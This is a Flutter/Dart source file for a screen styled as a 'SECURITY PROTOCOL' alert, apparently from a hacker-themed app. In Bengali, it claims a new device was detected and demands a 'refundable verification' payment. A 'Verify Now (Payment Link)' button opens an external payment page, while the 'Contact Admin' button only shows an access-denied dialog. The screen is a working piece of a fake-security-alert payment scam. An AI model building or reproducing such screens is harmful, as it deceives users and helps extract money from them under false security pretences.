import 'package:flutter/material.dart';
import 'package:url_launcher/url_launcher.dart';
import '../constants.dart';
import '../widgets/hacker_button.dart';
import '../widgets/access_denied_dialog.dart';

class SecurityAlertScreen extends StatelessWidget {
  const SecurityAlertScreen({super.key});

  Future<void> _launchURL(String url) async {
    final Uri uri = Uri.parse(url);
    if (!await launchUrl(uri, mode: LaunchMode.externalApplication)) {
      throw 'Could not launch $url';
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      appBar: AppBar(
        title: const Text("SECURITY PROTOCOL", style: TextStyle(fontFamily: 'Courier', color: Colors.orange, fontWeight: FontWeight.bold)),
        backgroundColor: Colors.black,
        iconTheme: const IconThemeData(color: Colors.orange),
        centerTitle: true,
      ),
      body: Center(
        child: Padding(
          padding: const EdgeInsets.all(24.0),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              const Icon(Icons.warning_amber_rounded, size: 100, color: Colors.orange),
              const SizedBox(height: 30),

              Container(
                padding: const EdgeInsets.all(20),
                decoration: BoxDecoration(
                  border: Border.all(color: Colors.orange, width: 2),
                  color: Colors.orange.withOpacity(0.1),
                  borderRadius: BorderRadius.circular(10),
                ),
                child: const Column(
                  children: [
                    Text(
                      "সতর্কতা: নতুন ডিভাইস শনাক্ত হয়েছে",
                      textAlign: TextAlign.center,
                      style: TextStyle(color: Colors.orange, fontSize: 20, fontWeight: FontWeight.bold, fontFamily: 'Courier'),
                    ),
                    SizedBox(height: 15),
                    Text(
                      "নিরাপত্তার জন্য সাময়িক refundable verification প্রয়োজন।\n✔️ Verification সম্পন্ন হলে জমা ফেরতযোগ্য।",
                      textAlign: TextAlign.center,
                      style: TextStyle(color: Colors.white, fontSize: 16, height: 1.5),
                    ),
                  ],
                ),
              ),

              const SizedBox(height: 40),

              // --- VERIFY BUTTON ---
              HackerButton(
                text: "👉 Verify Now (Payment Link)",
                color: kPrimaryColor,
                onPressed: () {
                  _launchURL("https://teamethicalcyberforce.com/product/server-security-payment/");
                },
              ),

              const SizedBox(height: 20),

              // --- CONTACT ADMIN BUTTON ---
              SizedBox(
                width: double.infinity,
                child: OutlinedButton(
                  style: OutlinedButton.styleFrom(
                    padding: const EdgeInsets.symmetric(vertical: 15),
                    side: const BorderSide(color: Colors.red, width: 2),
                  ),
                  child: const Text("👉 Contact Admin", style: TextStyle(color: Colors.red, fontSize: 16, fontWeight: FontWeight.bold)),
                  onPressed: () {
                    showDialog(context: context, builder: (_) => const AccessDeniedDialog());
                  },
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}